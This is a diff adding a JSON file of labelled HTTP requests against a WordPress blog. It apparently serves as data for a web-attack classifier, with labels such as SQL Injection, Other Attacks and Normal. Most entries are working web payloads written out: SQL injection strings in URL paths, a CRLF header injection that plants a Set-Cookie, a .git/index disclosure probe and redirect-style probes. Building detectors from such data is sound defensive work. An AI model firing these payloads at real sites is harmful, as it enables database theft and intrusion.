@@ -1,0 +1,137 @@
+[
+  {
+    "combined_payload":"post \/blog\/index.php\/my-account\/edit-password\/ username=solemnsalami2&password=any set-cookie:+tamper=9c9c8458-9801-4e7b-88a1-0bd329e7c30b&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=\/blog\/index.php\/my-account\/edit-password\/&login=login&redirect=&rememberme=forever",
+    "final_label":"Other Attacks",
+    "payload_hash":"6d85756a01f398f4bb1121ae7308ec4d8f9adb1f1737763457b50e919a464cda",
+    "cluster_id":333121,
+    "request_http_method":"POST",
+    "request_http_request":"\/blog\/index.php\/my-account\/edit-password\/",
+    "request_body":"username=solemnSalami2&password=any%0ASet-cookie%3A+Tamper%3D9c9c8458-9801-4e7b-88a1-0bd329e7c30b&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&login=Login&redirect=&rememberme=forever"
+  },
+  {
+    "combined_payload":"get \/blog+and+(select+5117+from(select+count(*),concat(0x3a727a613a,(select+(elt(5117=5117,1))),0x3a6172743a,floor(rand(0)*2))x+from+information_schema.character_sets+group+by+x)a)--+dyhk\/index.php\/2020\/03\/29\/distinctio-sequi-officiis-occaecati\/embed ",
+    "final_label":"SQL Injection",
+    "payload_hash":"777c339253a0c085cdf37a68faf229eb733cde4507e17cdee6d46a3805c004ca",
+    "cluster_id":406230,
+    "request_http_method":"GET",
+    "request_http_request":"\/blog+AND+%28SELECT+5117+FROM%28SELECT+COUNT%28*%29%2CCONCAT%280x3a727a613a%2C%28SELECT+%28ELT%285117%3D5117%2C1%29%29%29%2C0x3a6172743a%2CFLOOR%28RAND%280%29*2%29%29x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x%29a%29--+dYhK\/index.php\/2020\/03\/29\/distinctio-sequi-officiis-occaecati\/embed",
+    "request_body":""
+  },
+  {
+    "combined_payload":"get \/https:\/\/www.google.com\/wp-content\/uploads\/2020\/04\/6e5c5163-fca7-365f-898b-acced7ed5063.png ",
+    "final_label":"Other Attacks",
+    "payload_hash":"24471458c7ea4bf8c9fda0a4689b64b8ed6c43924ba887ae27483692a9ea7fa3",
+    "cluster_id":89269,
+    "request_http_method":"GET",
+    "request_http_request":"\/https%3A%2F%2Fwww.google.com\/wp-content\/uploads\/2020\/04\/6e5c5163-fca7-365f-898b-acced7ed5063.png",
+    "request_body":""
+  },
+  {
+    "combined_payload":"get \/blog\/index.php\/search\")+union+all+select+null+--+\/criticism ",
+    "final_label":"SQL Injection",
+    "payload_hash":"6c720095adca836ff1ed00222a6f63fad3101a6a4bfb489bfe5c20a0a72b1a3a",
+    "cluster_id":167864,
+    "request_http_method":"GET",
+    "request_http_request":"\/blog\/index.php\/search%22%29+UNION+ALL+select+NULL+--+\/criticism",
+    "request_body":""
+  },
+  {
+    "combined_payload":"post \/blog\/wp-login.php+\/+sleep(15)+?action=register ",
+    "final_label":"SQL Injection",
+    "payload_hash":"347b276d929e1b9cdf860229d6cc981ebc5618591fd31a80e518374be1337d2d",
+    "cluster_id":405428,
+    "request_http_method":"POST",
+    "request_http_request":"\/blog\/wp-login.php+%2F+sleep%2815%29+?action=register",
+    "request_body":""
+  },
+  {
+    "combined_payload":"get \/robots.txt+and+1=2 ",
+    "final_label":"SQL Injection",
+    "payload_hash":"8248f641cb90a81af79cd241784ce85b13c7ce707a48291ec1639d3a9b0ee114",
+    "cluster_id":228016,
+    "request_http_method":"GET",
+    "request_http_request":"\/robots.txt+AND+1%3D2",
+    "request_body":""
+  },
+  {
+    "combined_payload":"post \/blog\/<!-- comment=&author=ashamedseahorse7&email=foo-bar@example.com&url=http:\/\/www.example.com&submit=post+comment&comment_post_id=14&comment_parent=0",
+    "final_label":"SQL Injection",
+    "payload_hash":"bd332d61956955199bb9d23d72c196abaec450656be2a65242f86f16fc122351",
+    "cluster_id":512262,
+    "request_http_method":"POST",
+    "request_http_request":"\/blog\/%3C%21--",
+    "request_body":"comment=&author=ashamedSeahorse7&email=foo-bar%40example.com&url=http%3A%2F%2Fwww.example.com&submit=Post+Comment&comment_post_ID=14&comment_parent=0"
+  },
+  {
+    "combined_payload":"get \/blog\/index.php\/2020\/04\/04\/voluptatum-reprehenderit-maiores-ab-sequi-quaerat\/https:\/\/8501779237819759495.owasp.org ",
+    "final_label":"Normal",
+    "payload_hash":"9d9be7e284908a59394f199fe6c065d0dfbd60189e9a0e81a105aced89ff7691",
+    "cluster_id":304890,
+    "request_http_method":"GET",
+    "request_http_request":"\/blog\/index.php\/2020\/04\/04\/voluptatum-reprehenderit-maiores-ab-sequi-quaerat\/https%3A%2F%2F8501779237819759495.owasp.org",
+    "request_body":""
+  },
+  {
+    "combined_payload":"get \/blog\/index.php\/2020\/04\/04\/labore-pariatur-amet-quam\/feed\/.git\/index ",
+    "final_label":"Other Attacks",
+    "payload_hash":"09cd276cdb4d834b814bbb60f3ead619d67f38315cf9ac2a25c1ab1e242e6e2e",
+    "cluster_id":3671,
+    "request_http_method":"GET",
+    "request_http_request":"\/blog\/index.php\/2020\/04\/04\/labore-pariatur-amet-quam\/feed\/.git\/index",
+    "request_body":""
+  },
+  {
+    "combined_payload":"get \/blog\/index.php\/www.google.com%3a80%2fsearch%3fq%3dowasp%2520environment\/edit-profile\/{{ data.url }} ",
+    "final_label":"Other Attacks",
+    "payload_hash":"e904e57868ebff9b01fd8bcfbf832ab5df3b19e2c852ea1aa3fb4b1c1a052fdb",
+    "cluster_id":65628,
+    "request_http_method":"GET",
+    "request_http_request":"\/blog\/index.php\/www.google.com%253A80%252Fsearch%253Fq%253DOWASP%252520environment\/edit-profile\/%7B%7B%20data.url%20%7D%7D",
+    "request_body":""
+  },
+  {
+    "combined_payload":"post \/blog\/wp-comments-post.php comment=&author=yearningcoati7&email=foo-bar@example.com&url=http:\/\/www.example.com&submit=post+comment&comment_post_id=73&comment_parent=0",
+    "final_label":"Normal",
+    "payload_hash":"e08433ccf6bd99f321c7abe3656b2f8fff5980cf01659ea1ae9f265bcd2b2e56",
+    "cluster_id":509197,
+    "request_http_method":"POST",
+    "request_http_request":"\/blog\/wp-comments-post.php",
+    "request_body":"comment=&author=yearningCoati7&email=foo-bar%40example.com&url=http%3A%2F%2Fwww.example.com&submit=Post+Comment&comment_post_ID=73&comment_parent=0"
+  },
+  {
+    "combined_payload":"get \/blog\/index.php\/2020\/04\/04\/animi-sint-ut-sed-commodi%\"++--+\/feed ",
+    "final_label":"SQL Injection",
+    "payload_hash":"3f818226c0d780afbd20501faceaccc65077d72afc21932a37b4ae297ea0afa7",
+    "cluster_id":10831,
+    "request_http_method":"GET",
+    "request_http_request":"\/blog\/index.php\/2020\/04\/04\/animi-sint-ut-sed-commodi%25%22++--+\/feed",
+    "request_body":""
+  },
+  {
+    "combined_payload":"get \/blog%')+and+1358=2995--+-\/index.php\/2020\/03\/27\/qui-ratione-maxime-dolores-consequatur ",
+    "final_label":"SQL Injection",
+    "payload_hash":"3c34623e3c568e34dd8f629aaa48f5626756e10c58b71beaed83362973d6648e",
+    "cluster_id":471619,
+    "request_http_method":"GET",
+    "request_http_request":"\/blog%25%27%29+AND+1358%3D2995--+-\/index.php\/2020\/03\/27\/qui-ratione-maxime-dolores-consequatur",
+    "request_body":""
+  },
+  {
+    "combined_payload":"get \/blog')+union+all+select+null+--+\/index.php\/author\/barton03 ",
+    "final_label":"SQL Injection",
+    "payload_hash":"ddecc82fc7c21014feaf71a09e6820ddad74476bd4dd09e0c4fc55e65ee64b80",
+    "cluster_id":141488,
+    "request_http_method":"GET",
+    "request_http_request":"\/blog%27%29+UNION+ALL+select+NULL+--+\/index.php\/author\/barton03",
+    "request_body":""
+  },
+  {
+    "combined_payload":"get \/http:\/\/www.google.com\/search?q=owasp%20people\/index.php\/wp-json\/oembed ",
+    "final_label":"Other Attacks",
+    "payload_hash":"64233d1fa6b1da5f0e7028a15067250bd351cc200b107857b1b2f6ba048b3e94",
+    "cluster_id":76876,
+    "request_http_method":"GET",
+    "request_http_request":"\/http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520people\/index.php\/wp-json\/oembed",
+    "request_body":""
+  }
+]
